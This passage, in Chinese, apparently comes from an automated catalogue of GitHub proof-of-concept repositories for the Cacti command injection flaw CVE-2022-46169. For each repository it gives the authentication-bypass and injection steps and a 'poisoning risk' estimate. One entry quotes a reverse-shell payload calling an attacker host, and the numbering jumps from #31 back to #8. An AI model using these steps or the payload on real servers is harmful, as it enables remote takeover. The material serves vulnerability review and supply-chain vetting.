*   LICENSE 使用的是公共领域许可证：这表明作者放弃了对代码的版权，鼓励自由使用和修改，但同时也增加了代码被滥用的风险。

尽管如此，仍然存在一些潜在的风险：

*   依赖项可能存在漏洞：Dockerfile 中安装的软件包可能存在未知的安全漏洞，攻击者可以通过这些漏洞入侵系统。 *   配置错误：不正确的 Cacti 配置可能导致安全问题。

**总体来说，该存储库的投毒风险较低，但仍需谨慎使用，并及时更新依赖项以避免潜在的安全风险。**

**项目地址:** [m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application](https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #26

**来源**: [CVE-2022-46169-miko550_CVE-2022-46169.md](../2022/CVE-2022-46169-miko550_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意操作系统命令。

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti并且存在具有POLLER_ACTION_SCRIPT_PHP（值为2）操作类型的 poller_item 配置项。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求，绕过身份验证，并在目标系统上执行任意操作系统命令。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP 头来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址。由于 poller 表中存在默认的服务器主机名条目，因此可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `remote_agent.php` 文件的 `polldata` 操作。`poll_for_data` 函数会检索请求参数并从数据库中加载相应的 `poller_item` 条目。如果 `poller_item` 的 `action` 字段等于 `POLLER_ACTION_SCRIPT_PHP`，则使用 `proc_open` 执行 PHP 脚本。攻击者可以控制 `$poller_id` 参数，该参数会被插入到传递给 `proc_open` 的字符串中，从而导致命令注入。
3.  **寻找合适的 poller_item：** 攻击者需要找到 `action` 类型为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。脚本通过暴力破解`host_id`和`local_data_ids`，直到找到匹配的`poller_item`。预定义的模版比如 *Device - Uptime* 很容易满足条件.

**POC有效性：**
提供的POC代码尝试自动化利用此漏洞。它首先检查目标URL的`/remote_agent.php`或者`/cacti/remote_agent.php`路径是否存在。然后，它尝试通过设置`X-Forwarded-For`头来绕过身份验证。如果身份验证绕过成功，它会尝试暴力破解`host_id`和`local_data_ids`来发现适合利用的`poller_item`。最后，如果找到了合适的`poller_item`，可以注入命令。

**投毒风险：**
查看了给出的python脚本`CVE-2022-46169.py`和`README.md`文件，主要是漏洞验证和利用的脚本，仓库中没有发现明显的恶意代码，但是仍然存在一定的投毒风险。例如，脚本可能会被修改为：

1.  **下载和执行恶意代码：**  在成功利用漏洞后，脚本可以从远程服务器下载并执行恶意代码。
2.  **修改系统文件：**  脚本可以修改系统文件，例如 `/etc/hosts`，将用户重定向到恶意网站。
3.  **收集敏感信息：** 脚本可以收集系统敏感信息，例如用户名、密码和网络配置，并将信息发送到远程服务器。

给出的投毒风险百分比为5%，主要考虑的点为作者开源了exp脚本，其他人可以通过下载该脚本然后进行修改，加入恶意代码，再进行传播，从而达到投毒的目的。

**项目地址:** [miko550/CVE-2022-46169](https://github.com/miko550/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #27

**来源**: [CVE-2022-46169-mind2hex_CVE-2022-46169.md](../2022/CVE-2022-46169-mind2hex_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要网络访问，存在启用了`POLLER_ACTION_SCRIPT_PHP`的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，并利用`polldata` action注入恶意命令。

**利用方式：**

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头为`127.0.0.1`来欺骗`get_client_addr`函数，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 绕过身份验证后，攻击者可以利用`polldata` action。`poller_id`参数未经过滤，直接传递给`proc_open`函数，导致命令注入。 需要存在一个`poller_item` 其action 类型为 `POLLER_ACTION_SCRIPT_PHP`
3.  **参数枚举：** 如果不知道`host_id`和`local_data_id`，可以使用提供的POC脚本进行暴力破解。

**有效性分析：**

根据漏洞描述和POC代码，该漏洞利用是有效的。POC代码实现了身份验证绕过和命令注入，并提供了暴力破解`host_id`和`local_data_id`的功能。

**投毒风险分析：**

查看提供的POC代码，未发现明显的投毒代码。脚本逻辑清晰，主要功能是漏洞利用。代码通过构造恶意请求来利用漏洞，没有发现尝试在目标系统上安装后门或执行恶意操作的迹象。因此，投毒风险很低，约为0%。脚本依赖`requests`库，如果`requests`库被篡改，可能存在风险，但这不属于此仓库本身的投毒。

**总结：**

CVE-2022-46169是一个严重的安全漏洞，允许未经身份验证的攻击者在Cacti服务器上执行任意命令。该漏洞利用简单，影响广泛，需要及时修补。提供的POC代码可以有效利用此漏洞。

**项目地址:** [mind2hex/CVE-2022-46169](https://github.com/mind2hex/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #28

**来源**: [CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md](../2022/CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行着受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `X-Forwarded-For` HTTP Header绕过身份验证，并结合构造恶意的 `poller_id` 参数，在 `remote_agent.php` 文件中执行任意操作系统命令。 

**有效性分析：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用过程如下：

1.  **身份验证绕过：** 通过设置 `X-Forwarded-For` HTTP Header 为 `127.0.0.1` 来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器的 IP 地址，从而绕过身份验证检查。
2.  **寻找有效的 `host_id` 和 `local_data_ids[]`：** 漏洞利用代码使用暴力破解的方式查找具有 `POLLER_ACTION_SCRIPT_PHP` 动作类型的 `poller_item` 所对应的 `host_id` 和 `local_data_ids[]`。  这是必要的，因为需要一个特定的配置才能触发命令注入点。
3.  **命令注入：** 构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。由于 `poller_id` 参数未经过滤，恶意命令会被注入到 `proc_open` 函数中执行。

参考搜索引擎结果，已经有公开的利用该漏洞的报告和利用代码，表明该漏洞是可利用的。

**投毒风险分析：**

代码本身的主要功能是利用 CVE-2022-46169 漏洞进行命令注入，实现远程代码执行。仔细审查代码，并未发现明显的恶意行为，例如上传恶意文件、篡改系统配置等。但是，任何从互联网上下载的代码都存在潜在风险，因此仍需谨慎使用。

以下是一些潜在的投毒风险和缓解措施：

*   **依赖项风险：** 代码中使用了 `requests` 和 `urllib.parse` 库。虽然这些库本身是安全的，但如果通过 `pip` 安装时，存在被中间人攻击替换为恶意库的风险。 建议从官方源安装依赖项，并验证其完整性。
*   **Payload 风险：** 攻击者可以构造恶意的命令，对目标系统造成破坏。例如，删除关键文件、停止服务等。用户在使用时需要谨慎，避免执行不信任的命令。
*   **隐蔽后门：** 作者可能在代码中添加一些不明显的后门，例如，将执行结果发送到远程服务器，或在系统上创建一个隐藏的账户。 尽管当前代码未发现此类行为，但仍需保持警惕。

综合考虑，认为该代码存在较低的投毒风险，约为 5%。 主要风险来自于使用者自身对命令的控制不当，以及作者可能加入不易察觉的隐蔽后门代码的可能性。使用前应仔细审查代码，并进行安全测试。

**漏洞利用方式：**

1.  攻击者发送带有特制 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式，找到有效的 `host_id` 和 `local_data_ids[]`，它们对应于一个配置为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。
3.  攻击者构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。
4.  服务器执行恶意命令，攻击者获得对服务器的控制权。

**项目地址:** [r1nzleer/RCE-Cacti-1.2.22](https://github.com/r1nzleer/RCE-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #29

**来源**: [CVE-2022-46169-ruycr4ft_CVE-2022-46169.md](../2022/CVE-2022-46169-ruycr4ft_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统上存在具有`POLLER_ACTION_SCRIPT_PHP` action类型的poller_item配置，并且能够通过伪造HTTP头绕过身份验证。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是一个存在于Cacti 1.2.23之前版本中的未经身份验证的命令注入漏洞。该漏洞存在于`remote_agent.php`文件中。攻击者可以通过伪造`X-Forwarded-For`等HTTP头来绕过身份验证，利用`get_client_addr`函数的缺陷，使其返回运行Cacti服务器的IP地址。然后，通过`polldata` action，攻击者可以控制`poller_id`参数，由于该参数未经过滤就被传递给`proc_open`函数执行，从而导致命令注入。PoC代码首先检查目标是否易受攻击，然后通过暴力破解`host_id`和`local_data_ids`来找到具有`POLLER_ACTION_SCRIPT_PHP` action的`poller_item`。 找到有效的`host_id`和`local_data_ids`后，将构造包含恶意payload的URL并发送到目标系统。攻击者可以利用此漏洞在目标服务器上执行任意命令，例如下载恶意软件或窃取敏感数据。

**投毒风险分析：**

PoC代码主要功能是利用漏洞，但存在轻微的投毒风险：

1.  **Payload来源：** PoC代码要求用户输入IP地址和端口，然后生成反向shell的payload。如果用户不小心输入了错误的IP地址或端口，可能会导致连接到错误的服务器，或者暴露自己的IP地址。
2.  **依赖外部资源：** PoC依赖于`requests`和`urllib.parse`库，这些库可能存在安全问题或被篡改，但可能性较低。
3.  **Payload执行环境：** 生成的payload在目标服务器上执行，如果目标服务器的安全配置不当，可能会被恶意利用。
4.  **代码可读性：** 代码相对清晰，没有明显的恶意行为，但仍然需要仔细审查。

总体来说，PoC代码的投毒风险较低，主要是由于用户输入和执行环境带来的风险。如果代码是从可信来源获取，并且用户仔细审查过代码，那么风险可以忽略不计。

**项目地址:** [ruycr4ft/CVE-2022-46169](https://github.com/ruycr4ft/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #30

**来源**: [CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md](../2022/CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在至少一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵`remote_agent.php`文件中的`poller_id`参数来执行任意操作系统命令。漏洞利用主要分为两个阶段：首先，通过设置`X-Forwarded-For`头绕过身份验证，伪造客户端IP地址，使其与Cacti服务器的IP地址匹配。然后，构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，最终导致命令注入。该POC代码通过循环尝试不同的`host_id`来发现可以利用的配置。POC代码没有发现明显的投毒行为，主要目的是利用漏洞执行命令。搜索引擎结果也表明该漏洞已被公开利用。

**项目地址:** [sAsPeCt488/CVE-2022-46169](https://github.com/sAsPeCt488/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #31

**来源**: [CVE-2022-46169-yassinebk_CVE-2022-46169.md](../2022/CVE-2022-46169-yassinebk_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务运行且存在特定的数据源配置（poller_item具有POLLER_ACTION_SCRIPT_PHP action）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未授权命令注入漏洞。攻击者可以利用`remote_agent.php`文件中的授权绕过缺陷，通过伪造HTTP头（例如`X-Forwarded-For`），绕过IP地址验证，并利用`polldata`操作中的`poller_id`参数进行命令注入。

**漏洞利用方式：**

1.  **授权绕过：** 通过设置`X-Forwarded-For` HTTP头，模拟Cacti服务器自身的IP地址，绕过`remote_agent.php`的授权检查。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，攻击者可以控制这些变量。
2.  **ID爆破：** 爆破`host_id`和`local_data_id`参数，寻找一个`poller_item`记录，其`action`字段的值为`POLLER_ACTION_SCRIPT_PHP` (值为2)，表明该条目会执行PHP脚本。
3.  **命令注入：** 将恶意命令注入到`poller_id`参数中。由于`get_nfilter_request_var`函数没有充分过滤该参数，导致命令注入。
4.  **远程代码执行：** 通过`proc_open`函数执行注入的命令，从而实现远程代码执行。

**有效性分析：**

根据漏洞描述和提供的POC代码，该漏洞利用方式是有效的。POC代码首先检查目标是否存在漏洞，然后通过爆破`host_id`和`local_data_id`找到合适的`poller_item`记录，最后构造包含恶意命令的URL并发送请求，实现远程代码执行。

**投毒风险分析：**

分析提供的POC代码，没有发现明显的恶意代码或后门。脚本的功能集中于漏洞利用，没有其他可疑操作。因此，投毒风险评估为0%。

**项目地址:** [yassinebk/CVE-2022-46169](https://github.com/yassinebk/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---



---

## POC #8

**来源**: [CVE-2022-46169-MarkStrendin_CVE-2022-46169.md](../2022/CVE-2022-46169-MarkStrendin_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** Cacti服务器运行，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item，需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求绕过身份验证，并利用 `remote_agent.php` 文件中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者可以通过设置 `X-Forwarded-For` 或其他 `HTTP_` 开头的 HTTP Header，伪造客户端IP地址，使其与Cacti服务器自身的IP地址相同。`get_client_addr` 函数会读取这些header，然后 `gethostbyaddr` 函数将伪造的IP解析为主机名。由于 Cacti 的 `poller` 表中默认存在服务器自身的主机名记录，因此绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 参数的请求，并指定 `host_id`、`local_data_ids[]` 和 `poller_id`。其中，`poller_id` 参数没有经过充分的过滤，攻击者可以在 `poller_id` 中注入恶意命令。
3.  **寻找合适的poller_item：** 为了触发命令注入，需要存在一个 `poller_item`，其 `action` 字段的值为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，用于利用 CVE-2022-46169 漏洞。该脚本首先检查目标是否易受攻击，然后暴力破解 `host_id` 和 `local_data_id`，以便找到具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。 一旦找到，它会构造一个包含恶意负载的 HTTP 请求并发送到 `remote_agent.php`。

**投毒风险分析：**

该代码主要目的是发送payload以获得反向shell，并没有发现恶意修改或删除文件等高危操作。代码的功能基本符合描述，但仍然存在一些潜在风险。

*   **依赖风险：** 代码依赖 `requests` 库，如果 `requests` 库被恶意篡改，可能会导致安全问题。
*   **配置错误：** 攻击者可能会错误配置 `attacker_ip` 和 `attacker_port`，导致攻击失败或暴露自己的IP地址。

根据以上分析，该POC存在较低的投毒风险。 代码的主要功能是利用已知漏洞，没有发现额外的恶意代码或隐藏功能，但也不能完全排除攻击者在实际使用中进行修改以达到其他目的的可能性。 风险评估较低，约为5%。

**结论：**

该漏洞的利用较为直接，POC代码有效。 漏洞存在投毒风险，但风险较低。

**项目地址:** [MarkStrendin/CVE-2022-46169](https://github.com/MarkStrendin/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #9

**来源**: [CVE-2022-46169-N1arut_CVE-2022-46169_POC.md](../2022/CVE-2022-46169-N1arut_CVE-2022-46169_POC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在`POLLER_ACTION_SCRIPT_PHP`类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 HTTP 头 `X-Forwarded-For` 绕过身份验证，并利用 `remote_agent.php` 脚本中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过:** 通过设置 `X-Forwarded-For` 头为 Cacti 服务器的 IP 地址，欺骗 `get_client_addr` 函数，绕过身份验证。
2.  **查找可利用的 poller_item:**  通过暴力破解 `host_id` 和 `local_data_id`，找到 `action` 为 `POLLER_ACTION_SCRIPT_PHP` (值为 2)的 `poller_item`。
3.  **命令注入:** 将恶意命令注入到 `poller_id` 参数中，通过 `proc_open` 函数执行。

**POC代码分析：**

*   `cacti_exploit.py` 脚本自动化了漏洞利用过程。
*   首先尝试访问 `/remote_agent.php?action=polldata` 或 `/cacti/remote_agent.php?action=polldata` 来确定正确的URL。
*   然后，脚本使用 `X-Forwarded-For` 头绕过身份验证。
*   接下来，脚本暴力破解 `host_id` 和 `local_data_ids` 来寻找合适的 `poller_item`。
*   最后，脚本构造包含反向 shell 命令的 URL，并发送请求来利用命令注入漏洞。

**有效性：**

根据漏洞描述、搜索结果以及提供的 POC 代码，此漏洞是有效的。搜索结果表明该漏洞已被积极利用。

**投毒风险：**

虽然该脚本的主要目的是利用 CVE-2022-46169 漏洞，但存在轻微的投毒风险。具体体现在：

*   **硬编码参数:** 脚本中存在一些硬编码的参数，例如 `poller_id=1`，`host_id=1`，`local_data_ids[]=1`, `words = ["cpu","cmd.php","polling_time","apache"]`。这些值在不同的 Cacti 部署中可能不同，如果用户不加修改直接使用，可能导致利用失败。这可以被视为一种隐蔽的“陷阱”，虽然不是恶意的后门，但也可能误导用户。
*   **反向Shell Payload:** 用户如果直接使用payload `sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`需要确保目标机器上存在sh.如果没有可能需要更换payload.如果不熟悉的用户可能利用失败.
*   **依赖第三方库:** 脚本依赖 `requests` 和 `urllib3` 库。如果用户从不可信的源安装这些库，可能会引入恶意代码。

尽管如此，该脚本没有发现明显的恶意代码（如删除文件、上传恶意文件等），因此投毒的概率较低，约为5%。主要风险在于使用不当或未能正确配置脚本导致利用失败。


**项目地址:** [N1arut/CVE-2022-46169_POC](https://github.com/N1arut/CVE-2022-46169_POC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #10

**来源**: [CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md](../2022/CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵`remote_agent.php`文件中的输入，利用`poller_id`参数执行任意操作系统命令。攻击流程如下：

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`头绕过身份验证。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，允许攻击者伪造客户端IP地址，从而通过`poller`表中的主机名检查。
2.  **触发命令注入：** 绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。`poll_for_data`函数检索请求参数并加载相应的`poller_item`条目。如果`poller_item`的`action`等于`POLLER_ACTION_SCRIPT_PHP`，则使用`proc_open`执行PHP脚本。`poller_id`参数在传递给`proc_open`之前未经过充分过滤，从而导致命令注入。
3.  **漏洞利用代码分析：**  `poc.sh` 脚本首先解析用户提供的参数（目标URL、本地IP和端口），然后构造反向shell的payload，并对其进行URL编码。脚本通过发送带有`X-Forwarded-For`头的HTTP请求来检查目标是否易受攻击。该脚本通过暴力破解`host_id`和`local_data_ids`来枚举有效的URL。最后，它使用构造的payload向目标发送一个请求，从而触发反向shell。
4.  **投毒风险评估：**  该POC的主要目的是利用漏洞实现反向Shell。检查`poc.sh`脚本，发现脚本本身主要功能是生成Payload、URL编码、发送HTTP请求。虽然存在修改反向连接IP和端口的可能性，但没有发现明显的恶意代码或后门。`README.md`中建议访问的GitHub仓库 (`https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application`)，用于搭建漏洞环境，**存在一定风险，应该注意**。总体而言，脚本投毒风险较低，初步评估为5%。风险主要来自于下载其他来源的poc，或者使用poc访问陌生的网址。
5.  **有效性评估:** 该POC的有效性较高，因为它可以自动化漏洞利用过程，从身份验证绕过到命令执行。多个搜索引擎结果表明该漏洞已被积极利用。
6.  **利用方式总结：** 通过伪造HTTP头绕过身份验证，然后利用未过滤的`poller_id`参数在`remote_agent.php`中注入命令，最终实现远程代码执行。

**项目地址:** [RdBBB3/SHELL-POC-CVE-2022-46169](https://github.com/RdBBB3/SHELL-POC-CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #11

**来源**: [CVE-2022-46169-Rickster5555_EH2-PoC.md](../2022/CVE-2022-46169-Rickster5555_EH2-PoC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响版本的Cacti，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中存在的一个命令注入漏洞，允许未经身份验证的攻击者在服务器上执行任意命令。漏洞存在于`remote_agent.php`文件中，由于对客户端IP地址的验证不严谨，攻击者可以通过设置`X-Forwarded-For`等HTTP头部绕过身份验证。绕过验证后，可以调用`polldata`动作，并利用`poller_id`参数的命令注入漏洞执行系统命令。

**利用方式：**

1.  攻击者发送带有恶意`X-Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含命令注入的`poller_id`参数的HTTP请求，发送到`remote_agent.php`，执行任意系统命令。 为了成功利用，必须存在一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP`（值为2）。

**POC有效性：**

提供的PoC代码通过发送带有特定HTTP头部的GET请求，利用`poller_id`参数执行命令注入。根据漏洞描述和PoC代码，该PoC是有效的，可以用于验证漏洞的存在。

**投毒风险：**

查看提供的文件，包括`README.md`、`cacti-CI-poc.py`、`docker-compose.yml`和`entrypoint.sh`。

*   `README.md`：包含漏洞描述、复现步骤和参考链接，没有发现恶意代码。
*   `cacti-CI-poc.py`：PoC脚本，用于发送HTTP请求触发命令注入，没有发现恶意代码，但利用时执行的命令完全由使用者控制，具有潜在风险。
*   `docker-compose.yml`：Docker Compose配置文件，用于构建包含漏洞版本的Cacti环境，没有发现恶意配置。
*   `entrypoint.sh`：Docker容器的入口脚本，用于初始化Cacti数据库和设置权限，没有发现明显的恶意代码，但其中`mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"`语句禁用了管理员密码强制修改，这可能会降低安全性。

总体来说，该仓库的投毒风险较低，但入口脚本中禁用了管理员密码强制修改，存在潜在的安全风险。

投毒风险评估：5%。

**项目地址:** [Rickster5555/EH2-PoC](https://github.com/Rickster5555/EH2-PoC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #12

**来源**: [CVE-2022-46169-Safarchand_CVE-2022-46169.md](../2022/CVE-2022-46169-Safarchand_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个命令注入漏洞。攻击者可以通过构造`X-Forwarded-For`头绕过身份验证，然后利用`remote_agent.php`中的`polldata`操作注入恶意命令。该POC利用`X-Forwarded-For`头伪造客户端IP，绕过身份验证，然后通过`poller_id`参数向`proc_open`函数传递恶意payload，从而执行任意命令。POC尝试通过暴力破解`host_id`来找到一个可用的`poller_item`。代码中使用了`pexpect`来创建一个交互式的nc会话，以便接收反向shell。虽然使用了base64编码，但这是为了避免命令中的特殊字符导致问题，不是隐藏恶意代码，但是通过nc反弹shell存在被利用进行恶意操作的风险，因此存在一定的投毒风险，但是概率较低。整体而言，POC代码目的是为了验证漏洞存在，因此投毒概率较低，约为10%。

**漏洞利用方式：**

1.  **绕过认证：** 通过设置`X-Forwarded-For`头为Cacti服务器的IP地址，欺骗`get_client_addr`函数，绕过认证。
2.  **触发命令注入：**  向`remote_agent.php`发送包含`polldata` action的请求，并将恶意命令注入到`poller_id`参数中。  利用`proc_open`函数执行注入的命令。
3. **反弹shell:** 该poc通过反弹shell获得服务器控制权。

**项目地址:** [Safarchand/CVE-2022-46169](https://github.com/Safarchand/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #13

**来源**: [CVE-2022-46169-SystemVll_CVE-2022-46169.md](../2022/CVE-2022-46169-SystemVll_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头中的`Forwarded-For`字段，绕过身份验证，然后通过`remote_agent.php`文件中的`polldata`操作，并结合一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，将恶意命令注入到`proc_open`函数中执行，从而实现远程代码执行。

**漏洞利用方式:**
1.  **身份验证绕过:** 通过设置`Forwarded-For`等HTTP头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入:**  发送带有恶意`poller_id`参数的请求到`remote_agent.php?action=polldata`，该参数会被插入到`proc_open`函数执行的命令中。
3.  **寻找`POLLER_ACTION_SCRIPT_PHP`:**  漏洞利用的前提是存在一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。需要找到对应的`host_id`和`local_data_id`。

**有效性:**
根据漏洞描述，此漏洞利用代码利用了未经授权的远程代理来执行任意系统命令，因此有效。

**投毒风险:**
提供的代码段是 Apache 2.0 许可协议，不包含任何可执行代码或恶意代码，因此投毒风险为0%。核心的PoC代码并没有提供，因此无法判断攻击者是否进行了后门代码验证，只能判断提供的许可协议不存在投毒风险。

**项目地址:** [SystemVll/CVE-2022-46169](https://github.com/SystemVll/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #14

**来源**: [CVE-2022-46169-a1665454764_CVE-2022-46169.md](../2022/CVE-2022-46169-a1665454764_CVE-2022-46169.md)

